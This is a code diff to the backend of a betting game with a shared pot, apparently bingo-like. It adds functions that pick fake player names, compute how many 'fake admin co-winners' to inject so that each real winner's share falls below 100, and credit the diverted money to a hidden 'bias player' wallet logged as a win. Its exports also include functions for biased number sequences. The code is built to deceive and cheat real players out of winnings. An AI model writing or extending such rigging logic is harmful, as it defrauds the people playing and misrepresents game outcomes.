@@ -693,6 +693,79 @@ async function resetBiasStats() {
   await cache.set(K.recentWinners, []);
 }
 
+// ─── Pick Multiple Unique Fake Names ───────────────────────────────
+async function pickMultipleFakeNames(count) {
+  let recent = (await cache.get(K.recentWinners)) || [];
+  if (!Array.isArray(recent)) recent = [];
+
+  const recentSet = new Set(recent);
+  const available = FAKE_NAMES.filter((n) => !recentSet.has(n));
+  const pool = available.length >= count ? available : [...FAKE_NAMES];
+
+  // Shuffle pool and pick first `count`
+  const shuffled = shuffleArray(pool);
+  const picked = shuffled.slice(0, Math.min(count, shuffled.length));
+
+  // Update recent winners
+  recent.push(...picked);
+  if (recent.length > 10) recent = recent.slice(-10);
+  await cache.set(K.recentWinners, recent);
+
+  return picked;
+}
+
+// ─── Compute Pot Dilution ──────────────────────────────────────────
+// If sharePerWinner >= 100, calculate how many fake admin co-winners
+// to inject so each share drops below 100.
+// Returns { dilute, fakesToAdd, sharePerWinner, adminTotal, totalWinners }
+function computeDilution(pot, realWinnerCount) {
+  const potNum = typeof pot === "object" && pot.toNumber
+    ? pot.toNumber()
+    : Number(pot);
+  const currentShare = potNum / Math.max(1, realWinnerCount);
+
+  if (currentShare < 100) {
+    return { dilute: false, fakesToAdd: 0, sharePerWinner: currentShare, adminTotal: 0, totalWinners: realWinnerCount };
+  }
+
+  // We need totalWinners such that potNum / totalWinners < 100
+  // totalWinners > potNum / 100  →  totalWinners = floor(potNum / 100) + 1
+  const totalWinners = Math.floor(potNum / 100) + 1;
+  const fakesToAdd = Math.max(0, totalWinners - realWinnerCount);
+  const sharePerWinner = potNum / totalWinners;
+  const adminTotal = sharePerWinner * fakesToAdd;
+
+  return { dilute: true, fakesToAdd, sharePerWinner, adminTotal, totalWinners };
+}
+
+// ─── Credit Admin Dilution ─────────────────────────────────────────
+// Credits the bias player wallet with the admin's diluted share and
+// records a transaction.
+async function creditAdminDilution(gameId, adminTotal, fakeNames) {
+  if (adminTotal <= 0) return;
+  try {
+    const biasPlayer = await ensureBiasPlayer();
+    await prisma.player.update({
+      where: { id: biasPlayer.id },
+      data: {
+        wallet: { increment: adminTotal },
+        wins: { increment: 1 },
+      },
+    });
+
+    await prisma.transaction.create({
+      data: {
+        playerId: biasPlayer.id,
+        kind: "win",
+        amount: adminTotal,
+        note: `Dilution game #${gameId} (${fakeNames.join(", ")})`,
+      },
+    });
+  } catch (err) {
+    console.error("creditAdminDilution error:", err);
+  }
+}
+
 // ─── Cleanup game keys ────────────────────────────────────────────
 async function cleanupGame(gameId) {
   await cache.del(K.gameCard(gameId));
@@ -711,6 +784,7 @@ module.exports = {
   getCurrentPatternIndex,
   advancePatternIndex,
   pickFakeName,
+  pickMultipleFakeNames,
   getRequiredNumbers,
   buildBiasedSequence,
   ensureBiasPlayer,
@@ -722,4 +796,6 @@ module.exports = {
   getBiasStatus,
   resetBiasStats,
   cleanupGame,
+  computeDilution,
+  creditAdminDilution,
 };
